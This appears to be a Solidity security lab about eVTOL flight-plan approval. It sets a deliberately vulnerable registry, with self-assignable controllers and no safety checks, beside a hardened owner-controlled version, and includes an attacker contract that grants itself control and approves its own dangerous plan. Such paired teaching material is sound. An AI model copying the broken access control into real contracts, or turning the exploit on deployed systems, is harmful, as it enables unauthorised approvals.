// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * SMART CONTRACT LAB:
 *   "Electric Vehicle Take-Off and Landing" (EVTOL)
 *
 * We model:
 *   - EVTOL flight plans (take-off & landing)
 *   - Operators submit flight plans
 *   - Controllers approve or deny
 *
 * INSECURE VERSION:
 *   - Anyone can become a controller
 *   - Anyone can file flight plans
 *   - Anyone can approve any plan
 *   - No safety checks on altitudes or time windows
 *
 * SECURE VERSION:
 *   - Owner assigns operators and controllers (ATC)
 *   - Only operators may file flight plans
 *   - Only controllers may approve
 *   - Simple safety constraints (altitude range, duration limits)
 */

/*//////////////////////////////////////////////////////////////
//                      INSECURE EVTOL REGISTRY
//////////////////////////////////////////////////////////////*/

contract EVTOLInsecure {
    struct FlightPlan {
        address operator;        // who filed the plan
        string vehicleId;        // EVTOL tail number / ID
        string originPad;        // take-off pad / vertiport
        string destinationPad;   // landing pad / vertiport
        uint256 startTime;       // take-off time (unix)
        uint256 endTime;         // landing time (unix)
        uint256 maxAltitude;     // in meters
        bool approved;
        address approvedBy;
        bool exists;
    }

    mapping(uint256 => FlightPlan) public plans;
    mapping(address => bool) public isController;  // ATC-like role, but insecure

    uint256 public nextPlanId;

    event ControllerSet(address indexed who, bool status);
    event FlightPlanFiled(uint256 indexed id, address indexed operator);
    event FlightPlanApproved(uint256 indexed id, address indexed controller);

    /**
     * ⚠ VULN #1:
     * Anyone can make themselves a "controller".
     */
    function setController(address who, bool status) external {
        isController[who] = status;
        emit ControllerSet(who, status);
    }

    /**
     * ⚠ VULN #2:
     * Anyone can file a flight plan with any data.
     */
    function fileFlightPlan(
        string calldata vehicleId,
        string calldata originPad,
        string calldata destinationPad,
        uint256 startTime,
        uint256 endTime,
        uint256 maxAltitude
    ) external returns (uint256) {
        uint256 id = nextPlanId++;

        plans[id] = FlightPlan({
            operator: msg.sender,
            vehicleId: vehicleId,
            originPad: originPad,
            destinationPad: destinationPad,
            startTime: startTime,
            endTime: endTime,
            maxAltitude: maxAltitude,
            approved: false,
            approvedBy: address(0),
            exists: true
        });

        emit FlightPlanFiled(id, msg.sender);
        return id;
    }

    /**
     * ⚠ VULN #3:
     * Anyone can approve any flight plan without constraints.
     */
    function approveFlightPlan(uint256 id) external {
        FlightPlan storage fp = plans[id];
        require(fp.exists, "NO_PLAN");

        fp.approved = true;
        fp.approvedBy = msg.sender;

        emit FlightPlanApproved(id, msg.sender);
    }

    /**
     * Fake "trusted flight" check.
     */
    function isTrustedFlight(uint256 id) external view returns (bool) {
        FlightPlan storage fp = plans[id];
        if (!fp.exists) return false;
        if (!fp.approved) return false;
        if (!isController[fp.approvedBy]) return false;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
//                            OWNABLE
//////////////////////////////////////////////////////////////*/

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);

    constructor() {
        owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    modifier onlyOwner {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "ZERO_ADDRESS");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}

/*//////////////////////////////////////////////////////////////
//                     SECURE EVTOL REGISTRY
//////////////////////////////////////////////////////////////*/

contract EVTOLSecure is Ownable {
    struct FlightPlan {
        uint256 id;
        address operator;      // must be authorized operator
        bytes32 vehicleIdHash; // hash of vehicle ID
        bytes32 originPadId;   // hash of origin pad
        bytes32 destinationPadId; // hash of destination pad
        uint256 startTime;     // take-off (unix)
        uint256 endTime;       // landing (unix)
        uint256 maxAltitude;   // meters
        bool approved;
        address approvedBy;    // ATC controller
        bool exists;
    }

    mapping(uint256 => FlightPlan) public plans;
    mapping(address => bool) public isOperator;    // EVTOL operators
    mapping(address => bool) public isController;  // ATC controllers

    uint256 public nextPlanId;

    // Simple safety policy parameters
    uint256 public minFlightDuration;  // e.g. 60 seconds
    uint256 public maxFlightDuration;  // e.g. 4 hours
    uint256 public maxAllowedAltitude; // e.g. 1500 meters

    event OperatorSet(address indexed who, bool status);
    event ControllerSet(address indexed who, bool status);
    event PolicyUpdated(uint256 minDuration, uint256 maxDuration, uint256 maxAltitude);
    event FlightPlanFiled(uint256 indexed id, address indexed operator, bytes32 vehicleIdHash);
    event FlightPlanApproved(uint256 indexed id, address indexed controller);

    modifier onlyOperator {
        require(isOperator[msg.sender], "NOT_OPERATOR");
        _;
    }

    modifier onlyController {
        require(isController[msg.sender], "NOT_CONTROLLER");
        _;
    }

    constructor() {
        // Set some reasonable defaults (can be updated by owner)
        minFlightDuration = 60;        // 1 minute
        maxFlightDuration = 4 hours;   // 4 hours
        maxAllowedAltitude = 1500;     // 1500m
        emit PolicyUpdated(minFlightDuration, maxFlightDuration, maxAllowedAltitude);
    }

    /**
     * Owner assigns EVTOL operators.
     */
    function setOperator(address who, bool status) external onlyOwner {
        require(who != address(0), "ZERO_ADDRESS");
        isOperator[who] = status;
        emit OperatorSet(who, status);
    }

    /**
     * Owner assigns ATC controllers.
     */
    function setController(address who, bool status) external onlyOwner {
        require(who != address(0), "ZERO_ADDRESS");
        isController[who] = status;
        emit ControllerSet(who, status);
    }

    /**
     * Owner may adjust safety policy bounds.
     */
    function updatePolicy(
        uint256 _minFlightDuration,
        uint256 _maxFlightDuration,
        uint256 _maxAllowedAltitude
    ) external onlyOwner {
        require(_minFlightDuration > 0, "MIN_ZERO");
        require(_maxFlightDuration >= _minFlightDuration, "BAD_DURATION");
        require(_maxAllowedAltitude > 0, "BAD_ALT");

        minFlightDuration = _minFlightDuration;
        maxFlightDuration = _maxFlightDuration;
        maxAllowedAltitude = _maxAllowedAltitude;

        emit PolicyUpdated(_minFlightDuration, _maxFlightDuration, _maxAllowedAltitude);
    }

    /**
     * Operator files a flight plan using hashes to hide exact pads / vehicle IDs.
     *
     * vehicleIdHash      = keccak256(abi.encodePacked("EVTOL-123"))
     * originPadId        = keccak256(abi.encodePacked("PHNOM-PENH-PAD-1"))
     * destinationPadId   = keccak256(abi.encodePacked("PP-AIRPORT-VERTIPORT"))
     */
    function fileFlightPlan(
        bytes32 vehicleIdHash,
        bytes32 originPadId,
        bytes32 destinationPadId,
        uint256 startTime,
        uint256 endTime,
        uint256 maxAltitude
    ) external onlyOperator returns (uint256) {
        require(vehicleIdHash != bytes32(0), "BAD_VEHICLE");
        require(originPadId != bytes32(0), "BAD_ORIGIN");
        require(destinationPadId != bytes32(0), "BAD_DEST");
        require(endTime > startTime, "BAD_TIME");

        uint256 duration = endTime - startTime;
        require(duration >= minFlightDuration, "DURATION_TOO_SHORT");
        require(duration <= maxFlightDuration, "DURATION_TOO_LONG");
        require(maxAltitude > 0 && maxAltitude <= maxAllowedAltitude, "BAD_ALTITUDE");

        uint256 id = nextPlanId++;

        plans[id] = FlightPlan({
            id: id,
            operator: msg.sender,
            vehicleIdHash: vehicleIdHash,
            originPadId: originPadId,
            destinationPadId: destinationPadId,
            startTime: startTime,
            endTime: endTime,
            maxAltitude: maxAltitude,
            approved: false,
            approvedBy: address(0),
            exists: true
        });

        emit FlightPlanFiled(id, msg.sender, vehicleIdHash);
        return id;
    }

    /**
     * Controller approves a flight plan after off-chain checks.
     */
    function approveFlightPlan(uint256 id) external onlyController {
        FlightPlan storage fp = plans[id];
        require(fp.exists, "NO_PLAN");

        // Enforce policy again in case operator changed rules since creation.
        uint256 duration = fp.endTime - fp.startTime;
        require(duration >= minFlightDuration, "DURATION_TOO_SHORT");
        require(duration <= maxFlightDuration, "DURATION_TOO_LONG");
        require(fp.maxAltitude > 0 && fp.maxAltitude <= maxAllowedAltitude, "BAD_ALTITUDE");

        fp.approved = true;
        fp.approvedBy = msg.sender;

        emit FlightPlanApproved(id, msg.sender);
    }

    /**
     * Trusted flight:
     *   - plan exists
     *   - operator is still authorized
     *   - approved
     *   - approvedBy is active controller
     *   - flight parameters within policy
     */
    function isTrustedFlight(uint256 id) external view returns (bool) {
        FlightPlan storage fp = plans[id];
        if (!fp.exists) return false;
        if (!isOperator[fp.operator]) return false;
        if (!fp.approved) return false;
        if (!isController[fp.approvedBy]) return false;

        uint256 duration = fp.endTime - fp.startTime;
        if (duration < minFlightDuration) return false;
        if (duration > maxFlightDuration) return false;
        if (fp.maxAltitude == 0 || fp.maxAltitude > maxAllowedAltitude) return false;

        return true;
    }
}

/*//////////////////////////////////////////////////////////////
//                         ATTACKER CONTRACT
//////////////////////////////////////////////////////////////*/

contract EVTOLAttacker {
    EVTOLInsecure public target;

    constructor(address _target) {
        target = EVTOLInsecure(_target);
    }

    /**
     * Step 1 — become controller in the insecure system.
     */
    function becomeController() public {
        target.setController(address(this), true);
    }

    /**
     * Step 2 — file a dangerous flight plan (e.g., extreme altitude).
     */
    function fileDangerousPlan(
        string calldata vehicleId,
        string calldata originPad,
        string calldata destinationPad,
        uint256 startTime,
        uint256 endTime,
        uint256 maxAltitude
    ) public returns (uint256) {
        return target.fileFlightPlan(
            vehicleId,
            originPad,
            destinationPad,
            startTime,
            endTime,
            maxAltitude
        );
    }

    /**
     * Step 3 — approve your own dangerous plan.
     */
    function approveDangerous(uint256 id) public {
        target.approveFlightPlan(id);
    }

    /**
     * One-click full exploit:
     *   - become controller
     *   - file dangerous plan
     *   - approve it
     */
    function fullAttack(
        string calldata vehicleId,
        string calldata originPad,
        string calldata destinationPad,
        uint256 startTime,
        uint256 endTime,
        uint256 maxAltitude
    ) external returns (uint256) {
        becomeController();
        uint256 id = fileDangerousPlan(
            vehicleId,
            originPad,
            destinationPad,
            startTime,
            endTime,
            maxAltitude
        );
        approveDangerous(id);
        return id;
    }
}
